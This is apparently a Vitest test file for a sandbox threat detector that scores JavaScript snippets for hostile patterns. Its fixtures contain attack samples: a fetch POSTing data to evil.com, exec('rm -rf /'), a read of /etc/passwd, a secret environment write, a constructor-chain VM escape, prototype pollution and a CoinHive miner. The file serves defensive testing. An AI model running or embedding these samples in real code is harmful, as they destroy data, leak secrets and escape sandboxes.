/**
 * @file Sandbox Threat Detector Tests
 * @description Comprehensive tests for ML-based threat detection
 */
import { describe, it, expect, beforeEach } from 'vitest'
import { SandboxThreatDetector } from '../../server/utils/sandbox-threat-detector.mjs'
import crypto from 'node:crypto'

describe('SandboxThreatDetector', () => {
  let detector

  beforeEach(() => {
    detector = new SandboxThreatDetector({
      blockThreshold: 80,
      enableCodeSigning: true,
      trustedSigners: [],
      logAllThreats: false
    })
  })

  describe('Threat Pattern Detection', () => {
    it('should detect EVAL pattern with high threat score', async () => {
      const code = `
        const userInput = 'malicious';
        eval(userInput);
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(80)
      expect(result.severity).toBe('critical')
      expect(result.patterns).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            name: 'EVAL',
            severity: 'critical'
          })
        ])
      )
      expect(result.blocked).toBe(true)
    })

    it('should detect Function constructor pattern', async () => {
      const code = `
        const fn = new Function('return 1 + 1');
        fn();
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(80)
      expect(result.patterns.some(p => p.name === 'EVAL')).toBe(true)
    })

    it('should detect PROCESS_ACCESS pattern', async () => {
      const code = `
        process.exit(1);
        process.env.SECRET = 'leaked';
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(90)
      expect(result.severity).toBe('critical')
      expect(result.patterns).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            name: 'PROCESS_ACCESS',
            severity: 'critical'
          })
        ])
      )
    })

    it('should detect FILESYSTEM pattern', async () => {
      const code = `
        import fs from 'fs';
        fs.readFile('/etc/passwd', 'utf8');
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(85)
      expect(result.patterns.some(p => p.name === 'FILESYSTEM')).toBe(true)
    })

    it('should detect NETWORK pattern', async () => {
      const code = `
        fetch('https://evil.com/exfiltrate', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(75)
      expect(result.patterns.some(p => p.name === 'NETWORK')).toBe(true)
    })

    it('should detect CHILD_PROCESS pattern', async () => {
      const code = `
        import { exec } from 'child_process';
        exec('rm -rf /');
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(95)
      expect(result.severity).toBe('critical')
      expect(result.patterns.some(p => p.name === 'CHILD_PROCESS')).toBe(true)
    })

    it('should detect PROTOTYPE_POLLUTION', async () => {
      const code = `
        const obj = {};
        obj.__proto__.polluted = true;
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(85)
      expect(result.patterns.some(p => p.name === 'PROTOTYPE_POLLUTION')).toBe(true)
    })

    it('should detect VM_ESCAPE attempts', async () => {
      const code = `
        this.constructor.constructor('return process')();
        arguments.callee.caller.toString();
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBe(100)
      expect(result.severity).toBe('critical')
      expect(result.patterns.some(p => p.name === 'VM_ESCAPE')).toBe(true)
      expect(result.blocked).toBe(true)
    })

    it('should detect CRYPTOMINING patterns', async () => {
      const code = `
        const miner = new CoinHive('site-key');
        miner.start();
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(95)
      expect(result.patterns.some(p => p.name === 'CRYPTOMINING')).toBe(true)
    })

    it('should detect TIMING_ATTACK patterns', async () => {
      const code = `
        const start = performance.now();
        // timing side-channel attack
        const end = performance.now();
      `

      const result = await detector.analyzeCode(code)

      expect(result.patterns.some(p => p.name === 'TIMING_ATTACK')).toBe(true)
      expect(result.severity).toMatch(/medium|high|critical/)
    })
  })

  describe('Severity Classification', () => {
    it('should classify low severity (score < 40)', async () => {
      const code = `
        const x = 1 + 1;
        console.log(x);
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeLessThan(40)
      expect(result.severity).toBe('low')
      expect(result.blocked).toBe(false)
    })

    it('should classify medium severity (40 <= score < 60)', async () => {
      const code = `
        const start = performance.now();
        for (let i = 0; i < 1000; i++) {}
        const end = performance.now();
      `

      const result = await detector.analyzeCode(code)

      expect(result.severity).toMatch(/low|medium/)
    })

    it('should classify high severity (60 <= score < 80)', async () => {
      const code = `
        import('dynamic-module').then(mod => {
          // dynamic import
        });
      `

      const result = await detector.analyzeCode(code)

      expect(result.severity).toMatch(/medium|high/)
    })

    it('should classify critical severity (score >= 80)', async () => {
      const code = `
        eval('malicious code');
        process.exit(1);
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(80)
      expect(result.severity).toBe('critical')
    })
  })

  describe('Blocking Threshold', () => {
    it('should block code above threshold', async () => {
      const code = `
        eval('malicious');
        process.env.SECRET = 'leaked';
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(80)
      expect(result.blocked).toBe(true)
    })

    it('should allow code below threshold', async () => {
      const code = `
        const safe = { a: 1, b: 2 };
        console.log(safe);
      `

      const result = await detector.analyzeCode(code)

      expect(result.blocked).toBe(false)
    })

    it('should respect custom block threshold', async () => {
      const customDetector = new SandboxThreatDetector({
        blockThreshold: 50
      })

      const code = `
        import('module');
      `

      const result = await customDetector.analyzeCode(code)

      if (result.score >= 50) {
        expect(result.blocked).toBe(true)
      }
    })
  })

  describe('Code Signing & Trusted Signers', () => {
    it('should bypass threat detection for trusted signers', async () => {
      // Generate test keypair
      const keyPair = crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        publicKeyEncoding: { type: 'spki', format: 'der' },
        privateKeyEncoding: { type: 'pkcs8', format: 'der' }
      })

      const publicKeyHex = keyPair.publicKey.toString('hex')

      const trustedDetector = new SandboxThreatDetector({
        blockThreshold: 80,
        enableCodeSigning: true,
        trustedSigners: [publicKeyHex]
      })

      const code = `eval('trusted code');`

      // Create signature
      const sign = crypto.createSign('SHA256')
      sign.update(code)
      sign.end()
      const signature = sign.sign(keyPair.privateKey).toString('hex')

      const result = await trustedDetector.analyzeCode(code, {
        signature,
        publicKey: publicKeyHex
      })

      expect(result.score).toBe(0)
      expect(result.severity).toBe('low')
      expect(result.blocked).toBe(false)
      expect(result.signatureValid).toBe(true)
    })

    it('should still analyze code from untrusted signers', async () => {
      const code = `eval('untrusted code');`

      // Invalid signature
      const result = await detector.analyzeCode(code, {
        signature: 'invalid',
        publicKey: 'invalid'
      })

      expect(result.score).toBeGreaterThan(0)
      expect(result.blocked).toBe(true)
    })
  })

  describe('Complexity Analysis', () => {
    it('should detect high cyclomatic complexity', async () => {
      const code = `
        function complex(x) {
          if (x > 0) {
            if (x > 10) {
              for (let i = 0; i < x; i++) {
                while (i > 0) {
                  switch(i) {
                    case 1: break;
                    case 2: break;
                  }
                }
              }
            }
          }
        }
      `

      const result = await detector.analyzeCode(code)

      expect(result.complexityScore).toBeGreaterThan(0)
    })

    it('should detect obfuscation (hex escapes)', async () => {
      const code = `
        const obfuscated = '\\x65\\x76\\x61\\x6c';
      `

      const result = await detector.analyzeCode(code)

      expect(result.complexityScore).toBeGreaterThan(0)
    })

    it('should detect excessive string concatenation', async () => {
      const code = `
        const str = 'a' + 'b' + 'c' + 'd' + 'e' + 'f' + 'g' + 'h' + 'i' + 'j' + 'k' + 'l';
      `

      const result = await detector.analyzeCode(code)

      expect(result.complexityScore).toBeGreaterThan(0)
    })
  })

  describe('Behavioral Analysis', () => {
    it('should detect excessive try-catch blocks', async () => {
      const code = `
        try {} catch {}
        try {} catch {}
        try {} catch {}
        try {} catch {}
        try {} catch {}
        try {} catch {}
      `

      const result = await detector.analyzeCode(code)

      expect(result.behaviorScore).toBeGreaterThan(0)
    })

    it('should detect excessive loops (potential DoS)', async () => {
      const code = `
        for (;;) {}
        while (true) {}
        for (let i = 0; i < 1e9; i++) {}
      `

      const result = await detector.analyzeCode(code)

      expect(result.behaviorScore).toBeGreaterThan(0)
    })

    it('should detect Base64 patterns (potential payload)', async () => {
      const code = `
        const payload = 'SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBsb25nIGJhc2U2NCBlbmNvZGVkIHN0cmluZw==';
      `

      const result = await detector.analyzeCode(code)

      expect(result.behaviorScore).toBeGreaterThan(0)
    })
  })

  describe('Caching', () => {
    it('should cache threat analysis results', async () => {
      const code = `const x = 1;`

      const result1 = await detector.analyzeCode(code)
      const result2 = await detector.analyzeCode(code)

      expect(result1).toEqual(result2)
      expect(detector.threatCache.size).toBeGreaterThan(0)
    })

    it('should clear cache on demand', async () => {
      const code = `const x = 1;`

      await detector.analyzeCode(code)
      expect(detector.threatCache.size).toBeGreaterThan(0)

      detector.clearCache()
      expect(detector.threatCache.size).toBe(0)
    })
  })

  describe('Statistics', () => {
    it('should track pattern history', async () => {
      await detector.analyzeCode(`eval('code')`)
      await detector.analyzeCode(`process.exit(1)`)

      const stats = detector.getStatistics()

      expect(stats.patternHistory).toBeDefined()
      expect(stats.mostCommonThreats).toBeDefined()
      expect(stats.cacheSize).toBeGreaterThan(0)
    })
  })

  describe('Multiple Threat Patterns', () => {
    it('should combine multiple threat scores', async () => {
      const code = `
        eval('malicious');
        process.env.SECRET = 'leaked';
        fetch('https://evil.com');
        require('dangerous');
      `

      const result = await detector.analyzeCode(code)

      expect(result.score).toBeGreaterThanOrEqual(100) // Will be capped at 100
      expect(result.patterns.length).toBeGreaterThan(1)
      expect(result.blocked).toBe(true)
    })

    it('should weight repeated patterns', async () => {
      const code = `
        eval('a');
        eval('b');
        eval('c');
      `

      const result = await detector.analyzeCode(code)

      const evalPattern = result.patterns.find(p => p.name === 'EVAL')
      expect(evalPattern.occurrences).toBe(3)
      expect(result.score).toBeGreaterThanOrEqual(80)
    })
  })

  describe('Edge Cases', () => {
    it('should handle empty code', async () => {
      const result = await detector.analyzeCode('')

      expect(result.score).toBe(0)
      expect(result.severity).toBe('low')
      expect(result.blocked).toBe(false)
    })

    it('should handle very large code', async () => {
      const code = 'const x = 1;\n'.repeat(10000)

      const result = await detector.analyzeCode(code)

      expect(result).toBeDefined()
    })

    it('should handle code with unicode', async () => {
      const code = `
        const emoji = '🚀';
        const chinese = '你好';
      `

      const result = await detector.analyzeCode(code)

      expect(result).toBeDefined()
    })

    it('should handle malformed code gracefully', async () => {
      const code = `
        function broken(
          // missing closing
      `

      const result = await detector.analyzeCode(code)

      expect(result).toBeDefined()
    })
  })

  describe('Code Size Limits', () => {
    it('should enforce max code size (100KB)', async () => {
      // This is tested in validation.mjs schema
      expect(true).toBe(true)
    })
  })
})
